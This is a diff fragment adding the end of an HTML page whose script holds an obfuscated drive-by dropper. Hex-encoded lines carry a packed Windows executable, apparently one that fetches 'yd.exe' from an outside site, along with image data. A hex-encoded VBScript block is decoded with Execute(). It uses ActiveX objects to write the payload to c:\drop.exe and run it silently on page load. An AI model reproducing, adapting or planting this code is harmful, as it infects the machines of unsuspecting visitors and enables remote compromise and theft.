+Lines(18) = "7DB5A808DE3E0707276E26540E09000C93E04067080A34A982188F4DAB9C01607CEC046A6490732504106CD6E0D807AA043216DF044733DA24A0B80D3B0761B7156C4800E8FE32EEC13937DC552A5B0C11E24A3A0C54000D3A2D172AD1491247C4FEE4D0BE3D4E09090C4B0E036C0EC9CDAA08DF64C65F32B74D2D99B8FE2304C0B558E036590F60370F9B05C9CAF63136F489DDC83E1D5E022E0F4D28970DF67CDDA4108E181137FE108CE6AA881CC59E700AD68700CC1D8DC973D07EDB18621202117C0B132AB5B295ECB7841F0C0F2407B4D6BB66AF809FDA46F231680037C40018031B9064A97F095164F23B9F3AE150FF0D6983513706B46F4BE40768C05061213F7F3C83AF4CF7ED1FFC1B18DF27462E148FC4FE53DB89721298027C4897CB9AC311D23011E53A3F7588041E8C0B001480BBDA5EB30820597B05DB022F7070B842413F035236454E062CDF4870010B1E4DDD409DDF6446969344403874E4828E0ABFFF38DF06B02E5C5797365D68D5D5656B6B181A1CF2696C9B3393755E9C241019B2FC16AF38A3C87F0732223F736586AF4A642D1DF495820C601C7C632CB86AD814B402AE248EF04E805787574E1B2D44130A6C07FDB75B11E40C5AD2AB07A54CD86A96E61620205C832C010699403F58174D50A23E436CE962E2A11A22856B5C18A0E1C3C1D0F87252231CC261B3359B091938AA1A320A61F6F89A"
+Lines(19) = "B940FF3C1BD9310D3D748C9C4C704046121B12DAF7DA7414883635116C7C1D04071E57B9174B1C16999B9D7474BFE54E6C83ED74FB3DE5554413308ED82E834F15125BB080D77E93095B0A1E729937CE1A5841278D0D1A2EF6404DB1AEB6A600DD6F19E8A00814DB3A36CB10FF240A1FC82D0D2D250DB85B46BFB2071004A6256C125A660A1CFC47F76E91F53F021ECA0406451ADAB55D49213A8F22ECC8FEBED55A8E694F09143ADCFE0F5A6C69BAFFA8D80A871FF20A84D6171027C80463BBF6C40BD3190C220E48900D1AA621B46C50763B74C1286FCB22451C0024879A485ABECC43942BBD25B88D746896A42C046C0A0A260BE3E4BE832B09D92F8274CC1C747A6606861B60AE332AF652A18DF00831770412A4344A98307572016C314947D87304347024830F12780BA4588D01CD5DE74407EA35CCC80E100AAA67D9AAB1633C7B381C5648429403579E03E0DC32CDB8A859FF2D71E23B84125F6E9422DB04F80FAD80082884FE556A1652B27DC8F62874FE8B0D0164FEEC1B023D872C1F54FE83034404F221CB870D34FE440524FE5365B27CC80614FE560764F990E504FE5708F4FDC709960F593EE4FD450AD4FDFC0BE790E543C4FD000CB4E790E7900DA40E942F59F3B00FD184FD10DF6133C972B211DFFD0812FD9764394913FDC014299C6439D915DFFD5016FD6827594EB217FD8018FC0025FB922C190D1ADF"
+Lines(20) = "27594EF60D1BDFFC6A1CFC0D4996932C1DFC8B1E92E524CBFC4D1FFC082092E5645F2921DFFC1122B22FC972FC52232924DFB22FC972FC45255326DF6439C972FCFF27FC5028594EB29CFB0429FB892A96932C27FB452BFBFC2CE524CB49FB8B2DFB4D39C972922EFB082FFBC64EB29C6430FB8131FB87922C275932FB00334BF625FB0D34DF0D35DF0D2FD997EC36DF8B37DFB539C972B238DFFAFC39FA5F4EB29C643AFA5E3BFA5B276926593CFA3DFAE54996932C3EFA5D3F92E524CBFAC240FA04416439C972FA0042FACC43B22FD9970D44DF0D45DFC9BE645F0D46DF0D47DF4996937D0D48DFF9CC4925FB927D0D4ADF0D4BDF97EC4BF60D4CDF0D4DDF0D5FB22FD94EDF0D4FDF0D507DC9BE64DF0D51DF0D5234933493DFF953F95434933493F955F95634933493F957F95834933493F859F85A34933493F85BF85C34933493F85DF85E0D04F9920D5F4C04C06E3BF184F80A4C410A5A0BFCF63F1F21B87D0015D2C8FEF55F7CF8B6AD89DC021D1F0F780420FBDB8EDAFEAE28FA126C1104A0FEFCA0350E43B7AE41B51E66288D05FFB5DB0B414D0FF8346C035E4E0906A0950B8574F803C8005A0B6811FE0A60D8DBF79D12E86B211B4F2DF23CCCECD55E5030ECFE162B762D1821150A511F0F2B973CD0FE523698FE7EC881148D8898FE5E534C941A5627DAB9C55A9CDD815E54A3042C2BED14BBD21A6C2C0A558D"
+Lines(21) = "4B962364924060E02AC88135C4180F405160CDBA5832E07BD8BB499E6CF667E00A5556001CDE6DAC96D410236C090A57F7591119CAB15806977CE6CC88251A59001060F70DC820E00B645A5967635D3C0A5F5B0A2FD5F0D9C31AF0FEFF075C957AF56377C86C40B0F39A5D18466B16CE00C8B81C27ACC48FA1CB1CAB117ADAA13410CB1C07242D5EFB6E5120981B67C1F82A6DB71689F6150A1E6B26020CF018CC281EE7AE3F87A996E8073AFC5F487DDFAF9D6D1C3C4C0CD83B1E69342B6880B54708233A5A9B15DC1360F8720C0A9B116E2CE80E2826BE804198B8051EBCF42B4E3E80B7B0880858A77E40DB5E2C5901B76905AD84D8F86072ED1F390BD7B7046A811F2BEB6BCDB50073038E43905D173751FB05016830023D6F8034837522CC00E9CC444125CD9E0089820059204745600761A84B41FF014D6574684361FF6E679665FB0EF4FF0602FF9A0253560802D1FF5F0E02014556454E545F53494E4B5F1EFBFEDBF652656634442F46756E6374696F6E3B0023D9BA6F03206C65617349583D598A4E40098CBAFDB7BF7C66616320015F5F76626145780A70746DD9C620497234C7C80244655B965F601340CDB6E5C00C96A0198402405BB6655942AD6411686902FFE5D8656B4502EF50454C01030024C71542518AFE21E0000F010B010DA1E259573220133C1174E88B540C050B10B3C326011F043C9017B06F12"
+Lines(22) = "C41512AD0C1007B3BC843706AB946628D9AB92CB8058052802B29B1FC8BE6480272E74657874DC573E0BD960906098FA602E6426543DA00A1FD8DFB0C04B0DC02E7273726300C36FC89630802B27401B000070DF3C670DDC0924000000FF000060BE008040008DBE0090FFFF5783CDFFEB10EBEC909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9060000008A07472CE83C0177F7803F0275F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70589D8E2D98DBE008000008B0709C074458B5F048D843064A5000001F35083C708FF96A0A50000958A074708C074DC89F979070FB707475047B95748F2AE55FF96A4A5000009C07407890383C304EBD8FF96A8A5000061EB06ADFAEA0000EAE97769FFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+Lines(23) = "0000000024C715420000000000000300030000002800008006000000680000800E000000A8000080000000000000000000000000000001003200000040000080000000000000000000000000000001000000000058000000ECB00000E802000000000000000000000000000024C71542000000000000010001000000800000800000000024C7154200000000000001002904000098000000D8B3000074010000B0040000000000000000000024C71542000000000000010001000000C00000800000000024C71542000000000000010000000000D800000050B500002020100000000000E8020000160000002800000020000000400000000100040000000000800200000000000000000000000000000000000000000000000080000080000000808000800000008000800080800000C0C0C000808080000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF00000000008888888888888888888888880000000000000000000000000000000800000000FFFFFFFFFFFFFFFFFFFFFF0800000000FFF7888888888878878FFF0800000000FFF77777F7777788777FFF0800000000FFF7777788877888888FFF0800000000FFF7788887B37FFF888FFF0800000000FFF78887FA22A7F8888FFF0800000000FFF7808F7A203358888FFF0800000000FFF7080880023888888FFF0800000000FFF7888888888888"
+Lines(24) = "878FFF0800000000FFF7888888888887778FFF0800000000FFF7888888887777888FFF0800000000FFF7888877777778888FFF0800000000FFF7888777777888888FFF0800000000FFF7888777778888878FFF0800000000FFF7888888888887FF8FFF0800000000FFF78888888877777F8FFF0800000000FFF777777777F7777F7FFF0800000000FFFFFFFFFFFFFFFFFFFFFF08000000008888888888888888FFFFFF08000000000000000000000008FFFFFF08033333333333333333333308FFFFFF0803333FF333F33333FF333308FFFFFF0803333F3F33F3333F33F33308FFFFFF080333333F33FFF33F3F333308FFFFFF080333333F33F33F3F33333308FF88880003333FFFF3FFF333FF333308F0000000033333333333333333333308F0FFF00000000000000000000000000FF0FF000000000000FFFFFFFFFFFFFFFFF0F0000000000000000000000000000000000000FF000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000FE000000000000000000000000000000000000000000000000000001000000010000000300000007FE00000FFE00001FD083000000000000A900660061006C00610073007400650065006E00650065005F0035006100770061003500"
+Lines(25) = "40007900610068006F006F002E0063006F006D001400310014003100140030001400300014003000140031001400520075006E0064006C006C002E00140014003100300014002E006A0070006700140030003100300036003800140014004500720072006F0072002100140053006500720076006500720031001400740070003A002F002F0068006F006D0065002E007200690070007700610079002E0063006F006D002F0032003000300034002D0038002F003100360035003800360039002F00660069006C00650073002F00790064002E0065007800650021006500720072006F007200210053006500720076006500720031002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200000000000000000000000000000000000000000000000000000000000448500000000010001002020100000000000E80200003200000000000000000000000000B8B50000A0B50000000000000000000000000000C5B50000B0B500000000000000000000000000000000000000000000D2B50000E0B50000F0B500000000000045020080000000004B45524E454C33322E444C4C004D535642564D36302E444C4C0000004C6F61644C69627261727941000047657450726F634164647265737300004578697450726F63657373000000"
+Lines(26) = "FFD8FFE000104A46494600010200006400640000FFEC00114475636B7900010004000000500000FFEE000E41646F62650064C000000001FFDB0084000202020202020202020203020202030403020203040504040404040506050505050505060607070807070609090A0A09090C0C0C0C0C0C0C0C0C0C0C0C0C0C0C01030303050405090606090D0B090B0D0F0E0E0E0E0F0F0C0C0C0C0C0F0F0C0C0C0C0C0C0F0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0C0CFFC0001108005F005003011100021101031101FFC400970000010403000300000000000000000000080506070901030400020A01000203010100000000000000000000000204010305060010000201030303010702040504030000000102031104050021063112071341516171221408813291A14223B1C1526224D1728215331617110002020104010302050500000000000000010203112131120441511305812261719132334262141506FFDA000C03010002110311003F004A133F7B8EF6A8269524D3E3AD69BC969D6669366321208E809FF1F9EA09364772F43F513DC0D3727F4AEBDE0991E3E4A3857BA7B911902A598D0003A924F41A169EFE0AFC8C8C8F9738862DDE3FFDC7DF4D17EF8ECD1E5151FEF1F4FF003D56EC885C90849E77E38F722392DAFE285F6374514853F150C588D446D8B60F243EF19CF38F66A18DAC33"
+Lines(27) = "1148F2D7B620C524EE515A156008AEADE49EC1292F0297DF4ED330F5482CA190750D4EA09E9B6A5A3C99D325C4C46EE7B54D08A93FC29A85124F459E57913EA2096D89D4E300484B44FEEB8AEC49353EEAFCB4720CE86D80A75EAC34193C96A37B3BC931DC76CA4BCC84E21500FA518DDE47FE9441ED24EBD27847A4F009BCB79E66F944B2C734AF678D5DA3C6C6D414F7CA47EE3FCB4ACECCE854D8CD8180660455987D23553CF820DA8EE08A7F95352464EC82EE5B76325BCCD0B952A590D0D09D7B3823615B15CBB90E0EE6396CB25398D4FD56EEE5E3236A8ED6AD2BF0D5919B254B0C2EF8672EC772FC58BBB5731DE4145C8D8B1FAA373BD6BFD41A868757C67C8B53CEC3BD40EF0516BF58A9FD7561EC7A88EB21EE6A752E68BF1D1496340F08C5E5EC1676D35D5CB08A3B78CBCBF25153A87A1280D39672EBAE51967B890192DE3263C65AFB156A7EB34F69EBA42C9F269F8024D6C34198B318C6E4900D46E4FB4EAB2B5117F8D71FCAF20C9C16588B36BDBA90FF00F1528001D4B1F601ED3A194925BE0668EB4AC784828B8BFE227927912FDCCD8B9F1D6B2C7EAC3234684153D3A30FD28093A88DF0F2C6BFD659E844DE4AF0D729F1BCD035F5AC93594EA47DD346D17D63623B5C03D41A6AC538BD98B763A73AB7443D223840CC29F515614A1520743FA68931370F51CBC573F7BC6B296D7F652952AC12E6014ED9"
+Lines(28) = "6224772B7E9D3E3A38B6B544C5F10DCC6E4AD72305ADEDACA2482E552485C0DCAB50EFF1DF4DA792D4C4B12F6C92761041AD09D5AD7A84964837CC1CC64B7B45C059C8CB73904A5D32B569056846DFEA3B7C86A8BE6B1A01378D01EAD6EDA124A46A6671D818AEEAB4A76A8F7E90054BF0C8ACD107740F0888F6F73AAD496A9D855BA0F60A7B75192D8C72CB30FC34F0F439059B3792B5A1134758FF00A4F610E2320D4115049F96B2EEB1CE7C7C1D4FC7D30A69E6F72D4A2B45B38D446238D13E948827EDD874A13B6985151403B3991E73BE3F84E4D63718ACBE2E0BFB6950A30913B86FED5EEAD3F4D556B6B619A20A6B12D8A32FC86F1A1F17790EEF0D02F761B2709C861241520C5DE43250D775DD483A77AB3E7139EF93EB2A27B68F520D223458BB14B3C523C721F610A47613FC74C994D0407887904CF1CB87966358250F6D1BFB519892013D2874C532CE81C4946F2EBED20BAB80C3FE3A3BB1029FB413ABF1B84B6021E4796B8CC6666BA7904A66218B541FA42D47CBA9D21649B60BD44EB265DE597FAE5548547526B563F014D54F183D05A8E9C1199B302716FF0070037A9044E4B0ED4242834EBD08029AAE734D6A39D7ADF2D352F7BF1372B89C8F123630636EB0B9AC41419CB0BA8CA149A4501BB4900B28A501A6918D789E4DE9DCA55612C6023797727C1F12C4CD98CD5F259D8DB7D3713C8453B9B64551"
+Lines(29) = "D4B31D801BE98651083796C1AAFF00CED266A2BDB8E1FE32E57CA2DED8B2ADDADBC76B6ED41B95799EAFFF00883AAA70FEE4866AB925F6C5B2B8BF2B79658739878272AB2B3B9C564ECE5BFC5E6F097C9D9716973198DE48A45343FB4D41D1755706C57E5E4AE8C5ED80318E59284A286AA212C2A6A57DA7E7D34F25A9CEE1B1FF00C1B22D89E4F8C94BF7442E515B7FDD14D42ADFC4EFABEADF5216499B9F64E4C671ECA4E8E6B223A06A03B952371A72C9622D963D80BE024A090B8632554004F701B548F86F4D6639A2B8FA8A5636735F5DCB0C00B1896660BFF602694F8F4D0CDE9A9657172969E09CBC57C3396E5B98E22DB162DDD7239136B7924C639238D6DE48FD5370864478D1439A15FA890420274B5CA1C7EE343AB1B613CC51799C12FEEF1D73C5F112E35F1B7D92578B270C8A14FF0064B334AB500947FDC9500D0EEAA6A35935CB8D8923A9B52954DB5E071729C9632EED33794CAD9AE4F1B80B9636F67246B333CB10AA322B0EDEF24EC76A75A8D31CDC9BF44F04469F6E118E32DAC819732FC84E57C5BC97FF00D171DC22D67C8476E977736672082670D686F44310541BFA40D1A8632DF4873A3FF19EFC8567F24A32F6F802EFE54E6F05CE2F385728E3F6925A8E4D6325F5DACF17A523116FDB1997DEEB46426BBD3E5AB3ACDF2C315F94709C14A2B740538C123B5CDA2B13542A0B1A0A2D3A6B5211C9"
+Lines(30) = "CC278D0E98267B7C963CF70578A5443D8773D8FB03FC0EAC83D41C618437912C9AFF008DE5C893B65B58A59C47EC60AA41DFE5A6EEFDACB1EC06F6D71D8FEAD3E90CA5C1D8D03063FC69ACFC60A93248F1F6364CF66E7C7DA64D31590C9DC5BDBE38CABEA249F7375146CAFD0D143777D3BEDA5FB33E31C9A3F1F53B66E29E1B2F47C05E1FB0F13E1A35BE9E0E4B9F2417E422D523220EE691E34AD5C37A8CCE5989EEDBDD4D6546CCBE475CFAFC23C16FEA4916B955CCF90ADE7B6603ED2CEE7B093401A828A58EDDC41AD3542B39DB91AB29F6E9517A8B9C26EEDEF2DB2CB729DF1DC4EE6E6DC804063553DD5A835151AB3A735AE7D40F938B5C1C7C683579178B385DEDD3E47ED2E85E496FF68268AE1D5C5B035FB759379122FF0062B05F70D3764B4D04698272CB5A958FF99F7F6BC7B2FC6F8BE3E316F1595988B1F1C740B1C291EE07B8565A0D47513CE457E6A71AE318ADD80745702DEFBD789898D5C7A641276A0AEFB57AEB613F28E4FF00A999FB8ADEC24B540954B31EA68475D4A6092B798B925D5A24787B40523C8ABFDDDCAB1AD158563A7BD87F2D35D97841C983BA81DC586EABD7A56BEFA7CF48B009ABC0361064FCADC52CEEA1F563378665507B4892D90CF1303F0741B695EE7F1B353E27F9E3F997EDC6739164710B23A762CA5E29541A36DD40F8EB0EAB3747716432F299BF1FE3F5BAB8B8BE4CCDD4"
+Lines(31) = "113411C031EBDA205943339B80000DEAB77004962085514A68EAEAA9AC945DDAF6E42CE030973C7228E09B25264E582D52DE5C84A8914B726327FBB32C6027795A03DA00F6D074D5D5D5EDB6C1B3B1EEC527B99CEE504567348E42051B9AEC7E03DE745658920E8A97245357E6F5ADE3791B8FE49D243657D855585DB7513452B0901F603DA534E7C74D4A2FF339DFFA5D6C8B5B2407A813D345A541242B540FA8900546FF001D681CE1CD24AC278F7AD1E84FEB4D4C4825CF2CFA57D6D1C90C686649D18B8FDC140249A7CB4DDEB4C072D882E388924F4DEAA7D9B9F66926012BF873350716F27709CDDCBD2DADB2B02DE12400B14CDE8B935A7456AE97EC2E50687BA362AAD8B7EA5E1DAE173D92E256F73C672315A656C6F6EA478E58C4A971196DC2D0ECCBD454535CED9171DB73BDE9FB52B13B7F6FE06FC4F37F20E3A19AD6F2DE19E5EDA27DC4615A3607F7280B1823E0747D7ECDB14D69F53A1BFE2FA16E2516FE82C5A73FE5D75742CAE38A2646422827B69044DDC7FD43FB8BF3DC6ACF7E72DD7E8237FC4F5AB8F385BF462BF30EE4C871F4947A4933F7CD0FB03EC3B49E9EDD0DC8C9A26B52B63F3CB9362A4978A712C776BDE46CF7B9075A555517B15491EF66FE5AD1F8DAF8AC9CFF00FD0DF951822BC8066502BD081EEF70FF002D6AF239730F101708A4D596502A3E275E8EC14B71D3CC6E259F2651256FF8"
+Lines(32) = "C0C52293420C953D3E5B6ADBA5F730A6F41969136E093515A93D7F96A92B3AEDE3FAD3DA4B6FFF004D0BC20A2F52EA7F0B393E4E5F1BDB58F2469A58ECE656B1CB4A5A4FF8F3CAF1C0923354AD0C65412684768D67F67AAD494FC1D3FC776E2E1C5BD43D858E3676B75B86B77A822356456A81B9FF002D0284472574D652C89598FF00D5E2834DEBC16C9183EAB2D1474F97B74338AF01D7749AFB8103CAFE49871F6B94E448C16C3050C8B66D2D407948A22AAED52CDB0D447ADCB567A7D8E31CAF0531F32CE6579466AF33F9DBD7BEC95FCCDEA1724F6A8A5157DCA2B4035A54478A393EEDAEC9F2634483D7A0A96A6E34C78133644959E1FAA84B8A823D95D4123B799606FF00199A9CE4AD9ECE7B93DC2DE414702808EE1FD3504100EFA2B72A5F986E2BD469B46A5BB50339F76C7FC3D9A0D4878F1914F19632CF7112AA96258F6A81D69F0D0CA3CB089AD619F467F88FE3CB3C1F8EF08B7904373F7FC5B1F05EC4C0B29F5CC93BA10452A03AD7E3A6AE788A47A52C3D07B730E32980CCD8A0456B6BA67161092C91CF404954228165503751FB87D43DA065DF0C6A8E8BA1DC572E2FF721A97B6D87BB12C6F8A7370035564EE6036EABDCE4534BA7934B8A92D41B7C8BE0D8BCAD8FB7B2BDB9B8C6C11CC131F15A9FEE4F712BFA71A05218559881FB4902A7615D5F17AE3029DA8A706DBD100879F3F1DDFC5DC95F8C60"
+Lines(33) = "784F30CE4D0451C73E72E20FB9B7B9B909DD24B6A2D6203D36247682490A3735D69469FB731472F394582CA70AE593365218F8EE45AE709E99CCDA0B793D6B6129ED46922A77A8276AD3AEDA855CB38C152C8FEF19F8EF1F9FE43603925A66063EC2EE06E438E822682E45ABB76B490CB2230EE5AD7B48AB0AF690756C2A7E5164129792DE3C8BE17FC2BE417F93C8E2BCA5E33E2FC86E53B2E6D67CCE29ED7B96B56F445D23C6C436E54EFB6D515D1BBB55CA22F04E39F257AE7FF1CF84E37904507FFBD78C6F71374B24AB7586CEDADC762466843219902B907E952C6BF2DF42EB84BCE116426F3B12FF00E3FF0080BC3F92E5B6BC9796F98785E03038BBC0984E3971C8713364B231AD7BA49228EE98421BD8A6A46E7519841E9A96296362F0F8EDB60AD2C618B012DACD6091225B9B474917D351453DCA4D6BBD4EA89B93DCAB5F26CE4B6F81BAC4DC5BF257B44C3CE163B86BC916240CE691912315ED70DFB482083D37D54F0D6A1C3967EDDC852EF894B6F9386D23E5789BFC5518BE42FEE563BE8A84054648D3D3989DEAD543EF04EFA525441BD247494FC85CA189D526FF0004D0E0E23C6F0161C85321799EC4646FD55ED388D9DB5C02CB1950F7330466FAA660284A83DA8280FD4DA6298A8ECF266F7BB175AB5838C7EA4A37F1DB344CB3C91AB346EB1962A18020D4A93D29A6A0E5E3264C804BF203C5DE32E5F9"
+Lines(34) = "0B5C9F11F22E1B8779BB056A2E30E6CB23691E42EED818D6682E2C9A55696365DEA54856EBEFD351B1B7868F47298DFE39C3EFB3B9DE3791E47CCB8863F9059D87666E5B7963B492F2DBB83C42E6C2EBD378A5EE010B2557A15622835639C92CBCFE85998FA1FFD9"
+Dim Hez,DeCom
+Hez="&H"
+
+AA="66756E6374696F6E206465636F6D70286C696E65290D0A64696D20692C780D0A666F722069203D203120746F206C656E286C696E6529205374657020320D0A6465636F6D703D6465636F6D7020262063687228222648222026206D6964286C696E652C692C3229290D0A6E6578740D0A656E642066756E6374696F6E0D0A7375622073637269707428290D0A44696D2046534F2C57735368656C6C2C662C692C4170706C654F626A6563740D0A536574204170706C654F626A656374203D20646F63756D656E742E6170706C657473282243617A5F562229200D0A4170706C654F626A6563742E736574434C53494428227B46393335444332322D314346302D313144302D414442392D3030433034464435384130427D2229200D0A4170706C654F626A6563742E637265617465496E7374616E63652829200D0A5365742057735368656C6C203D204170706C654F626A6563742E4765744F626A65637428290D0A4170706C654F626A6563742E736574434C53494428227B30443433464530312D463039332D313143462D383934302D3030413043393035343232387D2229200D0A4170706C654F626A6563742E637265617465496E7374616E636528290D0A5365742046534F203D204170706C654F626A6563742E4765744F626A6563742829200D0A707468203D2022633A5C64726F702E657865220D0A69662066736F2E66696C656578697374732870746829207468656E2066736F2E64656C65746566696C6528707468290D0A5365742066203D2066736F2E4372656174655465787446696C65287074682C20466F7257726974696E67290D0A666F722069203D203120746F2075626F756E64286C696E6573290D0A662E7772697465206465636F6D70286C696E6573286929290D0A6E6578740D0A662E636C6F73650D0A57735368656C6C2E72756E28707468290D0A656E6420737562"
+Execute("For i = 1 To Len(AA) Step 2" & vbcrlf & "DeCom = DeCom & Chr(Hez & Mid(AA, i, 2))" & vbCrLf & "next")
+Execute(Decom)
+</Script>
+</Body>
+</Html>
+
+
